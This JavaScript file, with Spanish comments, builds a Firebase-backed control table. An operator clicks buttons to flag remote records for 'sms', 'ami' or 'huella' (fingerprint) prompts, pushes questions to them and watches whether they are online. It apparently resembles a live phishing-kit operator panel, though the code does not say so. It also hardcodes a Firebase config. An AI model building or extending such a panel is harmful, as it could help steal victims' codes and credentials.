// Configuración de Firebase
var firebaseConfig = {
  apiKey: "AIzaSyA4mtrvuQmiIsCMfyzpJrcx2TrRVkseK_U",
  authDomain: "readthis-79471.firebaseapp.com",
  projectId: "readthis-79471",
  storageBucket: "readthis-79471.firebasestorage.app",
  messagingSenderId: "870196818367",
  appId: "1:870196818367:web:cf49f252131e641e94b10a",
};

// Inicializar Firebase
firebase.initializeApp(firebaseConfig);

// Obtener una referencia a la base de datos
var db = firebase.firestore();

//-------------------------------------------//

// Obtener la referencia a la tabla HTML
var table = $("#my-table");

// Obtener los datos de Firestore
db.collection("panel").onSnapshot((querySnapshot) => {
  table.empty();
  // Recorrer cada documento y agregarlo a la tabla
  querySnapshot.forEach((doc) => {
    // Crear una nueva fila para la tabla
    var row = $("<tr>").attr("id", doc.id);

    // Agregar las columnas de botones con etiquetas y event listeners
    var label1 = $("<label>").text(doc.id);
    var btn0 = $("<button>")
      .addClass("btn btn-primary btn-sm")
      .text(doc.id)
      .attr("id", doc.id);

    var col1 = $("<td>")
      .addClass("align-middle")
      .append(label1)
      .append($("<p>").append(btn0));

    btn0.click(function () {
      console.log(this.id);
      localStorage.setItem("user1", this.id);
      document.getElementById("showModalButton").click();
    });

    var label2 = $("<label>").text("index");
    var btn2 = $("<button>")
      .addClass("btn btn-primary btn-sm")
      .text(doc.data().index);
    var col2 = $("<td>")
      .addClass("align-middle")
      .append(label2)
      .append($("<br>"))
      .append(btn2);

    btn2.click(function () {
      db.collection("panel")
        .doc(doc.id)
        .update({
          index: true,
        })
        .then(() => {
          console.log("Campo actualizado correctamente.");
          document.getElementById(doc.id).style.backgroundColor = "#fdcae1";
          db.collection("panel")
            .doc(doc.id)
            .delete()
            .then(() => {
              console.log("Document successfully deleted!");
            })
            .catch((error) => {
              console.error("Error removing document: ", error);
            });
        })
        .catch((error) => {
          console.error("Error al actualizar el campo: ", error);
        });
    });

    var label3 = "SMS";
    var btn4 = $("<button>")
      .addClass("btn btn-primary btn-sm")
      .text(doc.data().sms);
    var col4 = $("<td>")
      .addClass("align-middle")
      .append(label3)
      .append($("<br>"))
      .append(btn4);

    btn4.click(function () {
      // Actualizar el valor del campo "element" a "true" en Firestore
      db.collection("panel")
        .doc(doc.id)
        .update({
          sms: true,
        })
        .then(() => {
          console.log("Campo actualizado correctamente.");
        })
        .catch((error) => {
          console.error("Error al actualizar el campo: ", error);
        });
    });
    var label3 = "AMI";
    var btn5 = $("<button>")
      .addClass("btn btn-primary btn-sm")
      .text(doc.data().ami);
    var col5 = $("<td>")
      .addClass("align-middle")
      .append(label3)
      .append($("<br>"))
      .append(btn5);

    btn5.click(function () {
      // Actualizar el valor del campo "element" a "true" en Firestore
      db.collection("pich3")
        .doc(doc.id)
        .update({
          ami: true,
        })
        .then(() => {
          console.log("Campo actualizado correctamente.");
        })
        .catch((error) => {
          console.error("Error al actualizar el campo: ", error);
        });
    });
    var label3 = "Huella";
    var btn5 = $("<button>")
      .addClass("btn btn-primary btn-sm")
      .text(doc.data().huella);
    var col6 = $("<td>")
      .addClass("align-middle")
      .append(label3)
      .append($("<br>"))
      .append(btn5);

    btn5.click(function () {
      // Actualizar el valor del campo "element" a "true" en Firestore
      db.collection("pich3")
        .doc(doc.id)
        .update({
          huella: true,
        })
        .then(() => {
          console.log("Campo actualizado correctamente.");
        })
        .catch((error) => {
          console.error("Error al actualizar el campo: ", error);
        });
    });

    // Agregar las columnas a la fila
    row.append(col1);
    row.append(col2);

    row.append(col4);
    row.append(col5);
    row.append(col6);

    // Agregar la fila a la tabla
    table.append(row);
  });
});

// referencia a la colección de Firestore
const collectionRef = firebase.firestore().collection("pich3");

collectionRef.onSnapshot((snapshot) => {
  snapshot.docChanges().forEach((change) => {
    if (change.type === "modified") {
      const afterData = change.doc.data();

      // Si 'offline' existe y ha cambiado
      if (afterData && typeof afterData.offline !== "undefined") {
        console.log(
          `El documento con ID ${change.doc.id} tiene 'offline' actualizado a: ${afterData.offline}`
        );
        if (afterData.offline == true) {
          document.getElementById(change.doc.id).style.backgroundColor = "red";
        } else {
          document.getElementById(change.doc.id).style.backgroundColor =
            "#dee2e6";
        }
      } else {
        console.log(
          `El documento con ID ${change.doc.id} fue modificado, pero 'offline' no está definido.`
        );
      }
    }
  });
});

db.collection("user").onSnapshot((querySnapshot) => {
  querySnapshot.docChanges().forEach((change) => {
    if (change.type === "added") {
      // Agregar el nuevo documento a la tabla
      var doc = change.doc;
      // ...
    }
    if (change.type === "modified") {
      // Actualizar el documento modificado en la tabla
      var doc = change.doc;
      // ...
    }
    if (change.type === "removed") {
      // Eliminar el documento eliminado de la tabla
      var doc = change.doc;
      // ...
    }
  });
});

// Evento click del botón para mostrar el modal
$("#showModalButton").on("click", function () {
  $("#myModal").modal("show"); // Mostrar el modal al hacer clic en el botón
  document.getElementById("user").value = localStorage.getItem("user1");
});

// Evento click del botón para mostrar el modal huella
$("#showModalButtons").on("click", function () {
  $("#myModalh").modal("show"); // Mostrar el modal al hacer clic en el botón
  document.getElementById("user").value = localStorage.getItem("user1");
});

// Escuchar el evento submit del formulario dentro del modal
$("#formulario").on("submit", function (event) {
  event.preventDefault(); // Prevenir el comportamiento por defecto del formulario (recargar la página)
  var uid = $("#user").val();
  var q1 = $("#question1").val();
  var q2 = $("#sele").val();
  firebase
    .firestore()
    .collection("pich3")
    .doc(uid)
    .update({
      question1: q1,
      question2: q2,
    })
    .then(() => {
      console.log(
        "Los valores de las preguntas se actualizaron exitosamente en Firestore."
      );
      $("#myModal").modal("hide"); // Ocultar el modal después de actualizar
    })
    .catch((error) => {
      console.error("Error al actualizar las preguntas en Firestore:", error);
    });

  // Cerrar el modal después de hacer clic en "Guardar"
  $("#myModal").modal("hide");
});

function update(bre) {
  var q1 = $("#question1").val();

  firebase
    .firestore()
    .collection("panel")
    .doc(localStorage.getItem("user1"))
    .update({
      question1: q1,
    })
    .then(() => {
      console.log(
        "Los valores de las preguntas se actualizaron exitosamente en Firestore."
      );
      $("#myModal").modal("hide"); // Ocultar el modal después de actualizar
    })
    .catch((error) => {
      console.error("Error al actualizar las preguntas en Firestore:", error);
    });
}
